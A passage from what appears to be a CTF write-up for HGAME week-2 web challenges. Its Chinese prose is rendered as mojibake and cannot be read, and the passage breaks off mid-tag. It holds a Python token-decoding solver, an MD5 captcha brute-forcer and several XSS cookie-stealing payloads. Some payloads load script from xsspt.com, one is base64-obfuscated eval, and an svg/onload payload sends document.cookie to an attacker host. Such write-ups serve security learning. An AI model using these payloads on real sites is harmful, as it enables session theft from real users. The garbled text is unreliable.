title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h1><p>è¿™é“é¢˜ç¡®åˆ‡è¯´ä¸ç®—éš¾é¢˜å§ã€‚ä½†æ˜¯è‡ªå·±ä»ç„¶è€—è´¹äº†2ä¸ªå¤šå°æ—¶åœ¨è¿™ä¸Šé¢ï¼Œæ„Ÿè§‰æŒºåˆ’ä¸æ¥çš„â€¦â€¦</p><p>è¯ä¸å¤šè¯´ï¼Œå…ˆçœ‹é¢˜ç›®<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æºç "></p><p>åˆå§‹è¿›å»å‘ç°æœ‰æºç åŠå›æ˜¾ã€‚<br>æºç å¾ˆç®€æ´ï¼Œå…³é”®åœ¨äº<code>file_get_contents(&#39;mycode&#39;);</code>å¼€å§‹ä¹ æƒ¯æ€§ä»¥ä¸ºæ˜¯<code>file_get_contents()</code>çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ä½†æ˜¯ä»”ç»†çœ‹ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å¯æ§å‚æ•°ã€‚å› ä¸ºè¿™é‡Œçš„<code>&#39;mycode&#39;</code>æŒ‡ä»£çš„å…¶å®æ˜¯filename,å¦‚æœæœ‰ç–‘é—®ï¼Œé‚£ä¹ˆä¸å¦¨æ”¾åˆ°phpä¸­çœ‹çœ‹<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="filename"><br>ä¹Ÿå°±æ˜¯è¯´ï¼Œmycodeæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”å›æ˜¾çš„ä¸çŸ¥åå†…å®¹ä¹Ÿæ˜¯mycodeé‡Œé¢çš„ã€‚</p><p>å›æ˜¾å°±ä¸ç®€å•äº†ï¼Œçœ‹ä¼¼æ˜¯base64ï¼Œä½†è§£ç åä»ç„¶æ˜¯æœªçŸ¥ç¼–ç ã€‚é‚£ä¹ˆæˆ‘ä»¬ä»mycodeä¸‹æ‰‹ã€‚ç”±æºç å¯çŸ¥ï¼Œmycodeåº”è¯¥æ˜¯è·Ÿindex.phpåœ¨åŒä¸€ä¸ªç›®å½•ä¸‹çš„ï¼Œæ•…è®¿é—®ä¹‹ã€‚å¾—åˆ°æºç <br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/7.jpg" class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="mycode"><br>å¯ä»¥çŸ¥é“ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œå¹¶å¯¹<code>$_SERVER[&#39;token&#39;]</code>è¿›è¡Œäº†å¤šé‡ç¼–ç ã€‚åªè¦æˆ‘ä»¬postçš„tokenä¸æœåŠ¡å™¨çš„tokenç›¸åŒå³å¯æ‹¿åˆ°flagã€‚</p><p>å¼€å§‹æˆ‘æƒ³ï¼Œè¿™ä¸æ˜¯å¾ˆç®€å•å—ï¼ŒæŠŠç¼–ç å€’è¿‡æ¥è§£ç ä¸å°±å¥½äº†ï¼Ÿä½†æ˜¯è§£å‡ºtokenåå‘ç°æ²¡æœ‰æ‹¿åˆ°flagï¼Œä»”ç»†å›åˆ°åŸé¡µé¢ï¼Œå‘ç°ä¸€ä¸ªå¤§é—®é¢˜ï¼š<br>mycodeä¸­ç”¨äºåŠ å¯†<code>$_SERVER[&#39;token&#39;]</code>çš„æºç æ˜¯å˜åŒ–çš„ã€‚å”¯ä¸€ä¸å˜çš„æ˜¯åŠ å¯†å‡½æ•°çš„æ•°é‡æ€»æ˜¯10ä¸ªï¼Œè€ŒåŠ å¯†å‡½æ•°çš„ç§ç±»åªæœ‰<code>encrypt()</code>,<code>base64_encode()</code>,<code>strrev()</code>,<code>str_rot13()</code>è€Œè¿™ä½“ç°åœ¨index.phpä¸Šå›æ˜¾çš„å†…å®¹ä¹Ÿæ˜¯ä¸æ–­å˜æ¢çš„ã€‚ä¸”åŸºæœ¬ä¸Šå‡ ç§’é’Ÿå°±æ¢æ‰äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªèƒ½é è„šæœ¬è§£å†³ï¼Œè€Œä¸å¯èƒ½äººæ‰‹è§£å†³ã€‚<br>(å½“ç„¶ï¼Œä¹Ÿè®¸å¯ä»¥æŠŠå‡ ç§å­¤é›¶é›¶çš„åŠ å¯†é¡ºåºçš„å¯èƒ½æ€§ä¸æ–­è¯•ä¹Ÿè®¸åˆšå¥½ç¢°å¯¹äº†ã€‚ä½†è¿™æ— å¼‚äºå¤§æµ·æé’ˆï¼Œå°±æ²¡æœ‰æ„ä¹‰äº†ã€‚)</p><p>é¦–å…ˆè¿™é‡Œå…ˆæƒè¡¡ä¸‹è„šæœ¬çš„ä¹¦å†™æ–¹å¼ã€‚å¼€å§‹æˆ‘æ˜¯æƒ³ç”¨phpè„šæœ¬çš„ã€‚ä½†æ˜¯æˆ‘ä¸ä¼šphpä¸­ä¸pythoné‡Œrequestsåº“æœ‰ç›¸åŒåŠŸèƒ½çš„çŸ¥è¯†ï¼Œé‚£å°±åªèƒ½ç”¨pythonè„šæœ¬äº†ã€‚ä½†éšä¹‹è€Œæ¥çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦æŠŠåŠ å¯†çš„å‡½æ•°æ”¹ä¸€æ”¹ï¼Œè€Œä¸”pythoné‡Œè¿˜æ²¡æ‰¾åˆ°rot-13decodeçš„åº“â€¦â€¦ï¼ˆæˆ‘å°±æ˜¯å› ä¸ºæ‰¾äº†ä¸ªé”™çš„rot-13è§£ç è„šæœ¬å¯¼è‡´ç™½èŠ±äº†å¿«ä¸€ä¸ªå°æ—¶ï¼‰</p><p>æ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œè¯·æ±‚ä¸¤ä¸ªé¡µé¢ï¼Œåˆ†åˆ«ç”¨æ­£åˆ™æ‹¿åˆ°å›æ˜¾å†…å®¹ï¼Œä»¥åŠmycodeé‡Œ10ä¸ªåŠ å¯†å‡½æ•°ç»„æˆçš„å­—ç¬¦ä¸²ã€‚æˆ‘å†å¦å†™ä¸€ä¸ªå‡½æ•°åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ¯åŒ¹é…åˆ°ä¸€ä¸ªå‡½æ•°åå­—ç¬¦ä¸²æ‰§è¡Œå¯¹åº”çš„è§£å¯†å‡½æ•°ã€‚ï¼ˆç¨å¾®è§£é‡Šä¸‹ï¼Œå› ä¸ºè‡ªå·±ä¸€å¼€å§‹å¼„åäº†ã€‚æˆ‘ä»¬è§£å¯†æ˜¯è¦å¯¹å›æ˜¾å†…å®¹ä»å¤–å‘é‡Œè§£ï¼Œæ•…è°ƒç”¨çš„å‡½æ•°é¡ºåºä¸æˆ‘ä»¬ä»mycodeé‡Œè·å¾—åŠ å¯†å‡½æ•°å­—ç¬¦ä¸²ä¸­å‡½æ•°çš„é¡ºåºæ˜¯ä¸€è‡´çš„ã€‚<br>æ¯”å¦‚åŠ å¯†æ–¹å¼ï¼š</p><pre><code>$å¯†ç =base64_encode(str_rot13(strrev($åŸç )))</code></pre><p>æˆ‘ä»¬éœ€è¦ï¼š</p><pre><code>echo(strrev(str_rot13(base64_decode($å¯†ç ))))</code></pre><p>æ¥å¾—åˆ°åŸç ã€‚<br>ä½†æˆ‘å°è£…å¥½çš„åŒ¹é…å‡½æ•°çš„è°ƒç”¨é¡ºåºä»æ˜¯</p><pre><code>base64_decode , str_rot13(), strrev()</code></pre><p>è¢«è‡ªå·±ä¸€å¼€å§‹çš„phpè„šæœ¬çš„å›ºåŒ–å°è±¡å½±å“ï¼Œå¼„åäº†é¡ºåºå¯¼è‡´è€æ˜¯æŠ¥é”™ã€‚ä¸å¤ªåº”è¯¥ã€‚è¯ä¸å¤šè¯´ï¼Œè´´è„šæœ¬</p><pre><code class="python">import requestsimport reimport base64def str_rot13(s, OffSet=13):    def encodeCh(ch):        f = lambda x: chr((ord(ch) - x + OffSet) % 26 + x)        return f(97) if ch.islower() else (f(65) if ch.isupper() else ch)    return &#39;&#39;.join(encodeCh(c) for c in s)def strrev(str):    return str[::-1]def decrypt(str):    res=&#39;&#39;    for i in range(0,len(str)):        res+= chr(ord(str[i]) - 1)    return resdef exec(string,token):    if string==&#39;encrypt&#39;:        return decrypt(token)    if string==&#39;str_rot13&#39;:        return str_rot13(token)    if string==&#39;base64_encode&#39;:        f=str(base64.b64decode(token),&#39;utf-8&#39;)        return f    if string==&#39;strrev&#39;:        return strrev(token)url=&#39;http://76c59cdfab.php.hgame.n3ko.co&#39;url1=&#39;http://76c59cdfab.php.hgame.n3ko.co/mycode&#39;res=requests.get(url)res1=requests.get(url1)key=re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2]#print(key)key1=re.findall(r&#39;echo\((.*)\$&#39;,res1.text)[0]#print(key1)key1=key1.replace(&#39;(&#39;,&#39;&lt;br&gt;&#39;)#print(key1)token=keyprint(&#39;\n&#39;)for i in range(0, 10):    text = re.findall(r&#39;(.*?)&lt;br&gt;&#39;, key1)[i]    token=exec(text,token)print(token)data={    &#39;token&#39;:token}flag=requests.post(url=url,data=data)print(flag.text)</code></pre><p>å…¶ä¸­ä¸ºäº†æ–¹ä¾¿ï¼ŒæŠŠå‡ ä¸ªè§£å¯†å‡½æ•°é‡æ–°å°è£…ä¸€ä¸‹ã€‚<code>decrypt()</code>å¾ˆå¥½å†™ï¼Œ<code>str_rot13()</code>ä»ç½‘ä¸Šå«–çš„ã€‚<code>exec()</code>å°±æ˜¯ç”¨äºåŒ¹é…å­—ç¬¦ä¸²å¹¶æ‰§è¡Œçš„å‡½æ•°ï¼Œæ³¨æ„å…¶ä¸­çš„base64è¦è½¬å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ç„¶è§£å‡ºæ¥æ˜¯äºŒè¿›åˆ¶dataï¼›ä¹‹åçš„<code>key</code>ä¸<code>key1</code>åˆ†åˆ«ç”¨äºè·å–è¯·æ±‚çš„å†…å®¹ä¸­æˆ‘ä»¬è¦åˆ©ç”¨çš„å›æ˜¾ä¸å‡½æ•°éƒ¨åˆ†ã€‚è¿™é‡Œéœ€è¦è‡ªå·±è°ƒæ•´ä¸€ä¸‹,æ¯”å¦‚ï¼š</p><pre><code>key=re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2]</code></pre><p>æˆ‘ç”¨reçš„<code>findall()</code>å‡½æ•°ï¼Œç”±äºè¿”å›çš„æ˜¯åˆ—è¡¨æ•…è¦è®°å¾—æ ¹æ®<code>res.text</code>è°ƒæ•´å¯¹åº”çš„ä¸‹æ ‡ã€‚<br>ä¹‹åæˆ‘ä¹Ÿç”¨æ­£åˆ™å‡½æ•°ï¼ŒåŒ¹é…å‡ºå‡½æ•°å­—ç¬¦ä¸²ï¼Œå»æ‰æ‹¬å·éƒ¨åˆ†ï¼Œå¹¶åœ¨ä¹‹åè°ƒç”¨<code>exec()</code>å‡½æ•°æ—¶ï¼Œå†æ¬¡åˆ©ç”¨<code>findall()</code>çš„åŒ¹é…å¾—åˆ°å‡½æ•°åç»„æˆçš„åˆ—è¡¨ï¼Œä¾æ¬¡è°ƒç”¨ã€‚æœ€åè§£å‡ºtokenï¼Œpostè¯·æ±‚æ‹¿åˆ°flagã€‚<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/17.jpg" class="lazyload" data-srcset="17.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>ä»flagä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ç”¨phpè„šæœ¬â€¦â€¦ç„¶è€Œæˆ‘tclè€Œä¸ä¼šï¼Œä¸ç„¶å¯ä»¥çœæ‰ä¸å°‘æ—¶é—´ã€‚</p><h1 id="Cosmosçš„èŠå¤©å®¤"><a href="#Cosmosçš„èŠå¤©å®¤" class="headerlink" title="Cosmosçš„èŠå¤©å®¤"></a>Cosmosçš„èŠå¤©å®¤</h1><p>  èŠ±äº†æœ€é•¿æ—¶é—´çš„ä¸€é“é¢˜â€¦â€¦ä½†æ¯•ç«Ÿæ˜¯å¯¹æˆ‘æ¥è¯´æœ€éš¾çš„ä¸€é“äº†ï¼Œåšçš„éå¸¸è¾›è‹¦ä½†æ˜¯åˆæœ‰è®¸å¤šæ”¶è·ã€‚æ‰€ä»¥å°±ç€é‡ç¬”å¢¨å¤šè®°å½•ä¸‹è¿™é“é¢˜ï¼Œé¡ºä¾¿å½“è‡ªå·±çš„å­¦ä¹ ç¬”è®°å¥½äº†ã€‚</p><p>è¿›å…¥ç•Œé¢<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/8.jpg" class="lazyload" data-srcset="8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ç•Œé¢"></p><p>é¦–å…ˆå½“ç„¶æ˜¯åˆ¤æ–­æ¼æ´ç±»å‹äº†ã€‚<br>ä»é¢˜ç›®åå­—å¯ä»¥çŸ¥é“ï¼Œå¯èƒ½æ˜¯ä¸ªå‰ç«¯æ¼æ´ã€‚ç”±äºç•Œé¢å¼€å§‹å°±æä¾›äº†ä¸€ä¸ª<code>Flag is here</code>çš„buttonã€‚ç‚¹å‡»è¿›å»åå‘ç°æç¤º<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/9.jpg" class="lazyload" data-srcset="9.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="token"><br>è¿™é‡Œç›´æ¥è¯´æ˜æˆ‘ä»¬éœ€è¦adminçš„tokenæ‰èƒ½æ‹¿åˆ°flagã€‚å¥½çš„ï¼Œå‰ç«¯+tokenï¼Œåº”è¯¥ä¸éš¾æƒ³åˆ°éœ€è¦æˆ‘ä»¬é€šè¿‡xssæ‰“åˆ°adminçš„cookieæ¥è·å–tokenäº†ã€‚<br>ç„¶åæ•´ç†ä¸‹æ€è·¯ï¼Œå¤§æ¦‚æ˜¯å¦‚æ­¤:é€šè¿‡messageæäº¤payloadã€‚ç„¶åä¸‹é¢ä¸€ä¸ªéªŒè¯ç codeç”¨è„šæœ¬è·‘å‡ºæ¥ã€‚æ¯æ¬¡ç‚¹å‡»â€™æäº¤â€™æ—¶ï¼Œå°±ä¼šæŠŠä¹‹å‰ä¼ è¿‡çš„æ‰€æœ‰messageéƒ½å‘ç»™botã€‚botè‡ªç„¶æ˜¯å¸¦æœ‰adminæƒé™çš„äº†ï¼Œé‚£ä¹ˆå®ƒè®¿é—®æ—¶è§¦å‘æˆ‘ä»¬çš„payload,æˆ‘ä»¬æ‹¿åˆ°tokenå°±å¯ä»¥è®¿é—®/flagäº†ã€‚</p><p>ä¸‹é¢çš„éªŒè¯æ–¹å¼å¹¶ä¸éš¾ï¼Œåªæ˜¯ä¼šå¼ºè¡Œè€—æ—¶é—´ã€‚é€šå¸¸ç”¨è„šæœ¬è·‘å‡ºæ¥éƒ½æ˜¯7,8ä½æ•°ã€‚</p><pre><code class="python">import hashlibfor i in range(1,999999999):     code=hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()     print(code[:6])     if code[:6]==&#39;bfa9a6&#39;:         print(i)         break</code></pre><p>ä½†æ˜¯messageçš„å¤„ç†å°±ä¸ç®€å•äº†ã€‚ç®€å•çš„fuzzåä¼šå‘ç°å­˜åœ¨è¿‡æ»¤ä¸ç‰¹æ®Šå¤„ç†ã€‚è¿™ç‚¹ä¹‹åå†è¯´ã€‚å¥½åœ¨é¢˜ç›®è¯´æ˜äº†ï¼Œç­‰æˆ‘ä»¬æµ‹è¯•æˆåŠŸåå†æäº¤éªŒè¯ç ã€‚è¿™æ ·æ‰€æœ‰å†…å®¹éƒ½èƒ½äº¤åˆ°adminbotæ‰‹ä¸Šï¼Œä¸è‡³äºç‹‚è·‘è„šæœ¬æµªè´¹æ—¶é—´ã€‚</p><p>å…¶å®è‡ªå·±åœ¨è¿™é“é¢˜ä¹‹å‰å¹¶æ²¡æœ‰çœŸæ­£æ„ä¹‰ä¸Šåšè¿‡xssæ‰“cookieç±»å‹çš„é¢˜ç›®ã€‚å¤´ä¸€æ¬¡å¬è¯´æ˜¯åœ¨æ ¡èµ›ä¸Šä¸€é“simple_xssçš„é¢˜ç›®ã€‚é‚£é“é¢˜å°±æ˜¯ç®€å•çš„è¿‡æ»¤ä¸‹ç”¨xssæ‰“cookieï¼ˆå½“æ—¶é¢˜ç›®å‡ºäº†ä¸å°‘bugï¼Œç”šè‡³æºç æ³„éœ²ç›´æ¥æ‹¿flagéƒ½è¡Œâ€¦â€¦ï¼‰ã€‚ä¸è¿‡æˆ‘åªçŸ¥é“æœ€åŸºç¡€çš„xsspayloadï¼Œæ ¹æœ¬ä¸ä¼šåˆ©ç”¨xssæ‰“cookieã€‚äºæ˜¯è‡ªå·±å…ˆé€‰æ‹©ç™¾åº¦+googleï¼Œå¾—çŸ¥éœ€è¦xsså¹³å°ã€‚<br>æˆ‘ç”¨çš„è¿™ä¸ªåœ¨çº¿ç½‘ç«™ï¼š<a href="http://xsspt.com/" target="_blank" rel="noopener">http://xsspt.com/</a><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/10.jpg" class="lazyload" data-srcset="10.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å¹³å°"><br>äºæ˜¯æ˜ç™½ï¼Œå…¶å®å°±æ˜¯åœ¨xsså¹³å°åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼Œæ·»åŠ é»˜è®¤æ¨¡æ¿ä»¥åŠxss.jsæ¨¡æ¿,ä¹‹ååªè¦åœ¨xssæ¼æ´å¤„å°è¯•å¹³å°æä¾›ç»™æˆ‘ä»¬çš„payloadå³å¯ã€‚æ¯”å¦‚ï¼š<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/11.jpg" class="lazyload" data-srcset="11.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="payload"><br>å³å¯æ‰§è¡Œxssæ‰“cookieã€‚ä¸Šé¢é¡¹ç›®å‡ ä¸ªè®°å½•éƒ½æ˜¯æˆ‘åœ¨æœ¬åœ°çš„DVWAä¸Šç”¨xss-reflectedè¿™ä¸ªæ¼æ´çš„lowçº§åˆ«çš„è¾“å…¥æ‰“çš„ã€‚</p><p>åŒæ—¶ä¹Ÿæ³¨æ„åˆ°å‡ ç‚¹ï¼Œä»¥ä¸ŠpayloadåŸºæœ¬ä¸Šæ˜¯è¿™æ ·å‡ ä¸ªå½¢å¼</p><pre><code>1.&lt;script src=http://xsspt.com/mlRJMn&gt;&lt;/script&gt;2.&lt;img src=x onerror=eval(atob(&#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL21sUkpNbj8nK01hdGgucmFuZG9tKCk=&#39;))&gt;3.javascript:eval(&#39;window.s=document.createElement(&quot;script&quot;);window.s.src=&quot;//xsspt.com/mlRJMn&quot;;document.body.appendChild(window.s)&#39;)</code></pre><p>æˆ‘åˆ†ä¹‹ä¸º3ç§ï¼š<br>1.<code>&lt;script&gt;</code>æ ‡ç­¾çš„ç»å…¸payloadã€‚srcå±æ€§æ˜¯å¤–éƒ¨å¼•ç”¨<br>2.<code>&lt;img&gt;</code>æ ‡ç­¾çš„onerrorå±æ€§ï¼Œä¹Ÿæ˜¯ä¸€ç§ç»å…¸payloadã€‚åŒæ—¶ç”¨ä¸Š<code>eval(atob())</code>å¤„ç†base64å­—ç¬¦ä¸²æ¥bypassã€‚è¿˜åŸä¸‹æ˜¯è¿™æ ·çš„ï¼š</p><pre><code>s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://xsspt.com/mlRJMn?&#39;+Math.random()</code></pre><p>3.ä»¥åŠç¬¬ä¸‰ç§javascriptä¼ªåè®®ã€‚æœ‰æ•ˆé¿å…äº†å°–æ‹¬å·çš„å­˜åœ¨ã€‚<br>ä¸Šé¢1,2ä¸¤ç§payloadæˆ‘éƒ½ç”¨DVWAæ‰“åˆ°cookieäº†ã€‚ç¬¬ä¸‰ç§ä¸è¡Œã€‚</p><p>å›åˆ°é¢˜ç›®ä¸­æ¥ï¼Œè¿™é“é¢˜ç›®çš„è¿‡æ»¤æ¯”æƒ³è±¡ä¸­ä¸¥æ ¼çš„å¤šã€‚æˆ‘æŠŠåšé¢˜æ—¶çš„FUZZç»“æœè´´ä¸‹ï¼š</p><pre><code>1.scriptå…³é”®å­—è¢«è½¬ä¸º Hi there!2.è¾“å…¥å†…å®¹è½¬ä¸ºå¤§å†™3.æ ‡ç­¾æ•´ä½“è¿‡æ»¤&lt;&gt;</code></pre><p>ç¬¬ä¸€ç‚¹è¿˜å¥½ï¼Œ<code>script</code>è¿‡æ»¤äº†è¿˜æœ‰è¯¸å¦‚<code>img</code>,<code>svg/onload</code>ç­‰ç­‰payloadã€‚<br>ç¬¬äºŒç‚¹æœ‰ç‚¹éš¾åŠï¼Œå› ä¸ºé€šå¸¸æ ‡ç­¾åŒ…æ‹¬å±æ€§å¤§å†™åä»ç„¶èƒ½æ­£å¸¸å¤„ç†ï¼ˆå¤§å†™ç»•è¿‡æ˜¯ä¸€ç§å¸¸è§çš„ç»•è¿‡scriptçš„æ–¹æ³•ï¼‰ï¼Œä½†æ˜¯è¿å±æ€§çš„å€¼éƒ½å¤§å†™ä¼šä¸¥é‡å½±å“æˆ‘çš„payloadæ­£å¸¸æ‰§è¡Œã€‚æ¯”å¦‚<code>ALERT(1)</code>æ˜¯æ²¡æ³•æ‰§è¡Œçš„ã€‚xsså¹³å°ä¸Šç¬¬äºŒç§payload<code>base64</code>+<code>eval()</code>ä¹Ÿæ˜¯ä¸è¡Œçš„ã€‚å› ä¸ºå¤§å†™åå‡½æ•°ä¸èƒ½æ­£å¸¸æ‰§è¡Œäº†ï¼Œç¼–ç ä¹Ÿé”™è¯¯äº†ã€‚<br>ç¬¬ä¸‰ç‚¹éå¸¸éš¾åŠï¼Œåªè¦æœ‰æ ‡ç­¾å°±ç»™æ»¤æ‰ã€‚æ²¡æœ‰ä»€ä¹ˆåˆ«çš„ç»•è¿‡æ–¹æ³•ã€‚<br>æ‰€ä»¥xsså¹³å°æä¾›çš„payloadå…¨å†›è¦†æ²¡ï¼Œå¿…é¡»æƒ³ç»•è¿‡æ–¹æ³•ã€‚</p><p>è¿™æ—¶æˆ‘æƒ³åˆ°äº†å»å¹´æš‘å‡è‡ªå·±å†™çš„ä¸€ç¯‡æ–‡ç« ã€‚æ˜¯å…³äºxss.meä¸Šçš„xssæŒ‘æˆ˜çš„ã€‚å½“æ—¶åŸºæœ¬ä¸Šä¸€è·¯çœ‹ç€wpåšè¿‡æ¥ï¼Œå¥½å¤šéƒ½æ²¡ä»€ä¹ˆå°è±¡ã€‚ä½†ç°åœ¨å†çœ‹å´å‘ç°äº†æ„å¤–å®è—ï¼š<a href="https://www.jianshu.com/p/18473e2174f3" target="_blank" rel="noopener">https://www.jianshu.com/p/18473e2174f3</a><br>æ¯”å¦‚<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/12.jpg" class="lazyload" data-srcset="12.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="&lt;&gt;çš„ç»•è¿‡"><br>è¿˜æœ‰ï¼š<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/13.jpg" class="lazyload" data-srcset="13.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å¤§å†™çš„ç»•è¿‡"></p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥ä¸é—­åˆæ ‡ç­¾ï¼Œåˆ©ç”¨å®ä½“ç¼–ç å®Œæˆxssã€‚(æ²¡æƒ³åˆ°è¦é è‡ªå·±çš„æ–‡ç« è§£å†³â€¦â€¦å¥½å˜²è®½å•Š)<br>å¥½çš„ï¼Œè§£å†³äº†å°–æ‹¬å·ä¸å¤§å†™çš„é—®é¢˜åå†è§£å†³ä¸€ä¸‹<code>script</code>çš„é—®é¢˜å§ã€‚è¿™é‡Œæˆ‘æ‰¾åˆ°äº†skyå¸ˆå‚…ä¹‹å‰åšçš„xssé¢˜ç›®ä»¥åŠä»–åšå¾€å¹´hgameæ—¶å¯¹xssçš„ç»•è¿‡ã€‚<br><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br><a href="https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/" target="_blank" rel="noopener">https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/</a></p><p>ç¬¬ä¸€é“é¢˜xsséƒ¨åˆ†è¿‡æ»¤äº†è®¸å¤šå…³é”®å­—ï¼Œæ¯”å¦‚<code>script</code>ä»¥åŠ<code>onerror</code>ä½†æ˜¯å¯ä»¥ç”¨</p><pre><code class="javascript">&lt;svg/onload=&quot;document.location=&#39;vpsip:port&#39;&quot;&gt;</code></pre><p>(è¿™é‡ŒåŒæ—¶ä¹Ÿæé†’æˆ‘ï¼Œä¸ä¸€å®šè¦ç”¨xsså¹³å°ï¼Œç”¨vpsä¸Šçš„ncç›‘å¬ä¹Ÿå¯ä»¥ã€‚)<br>åŒæ—¶ç”¨ä¸‹é¢çš„payloadæ‰“cookie:</p><pre><code class="javascript">&lt;svg/onload=&quot;document.location=&#39;vpsip:port/?&#39;+document.cookie&quot;&gt;</code></pre><p>è¿™é‡Œæ˜¯ç”¨ç½‘é¡µipåçš„å‚æ•°å¸¦å‡ºcookieã€‚çœ‹åˆ°åé¢æˆ‘çš„ç»“æœå°±æ˜ç™½äº†ã€‚<br>åŠ ä¸Šå¸ˆå‚…hgameçš„payloadå…¶ä¸­çš„charcodeéƒ¨åˆ†å…¶å®å°±æ˜¯</p><pre><code 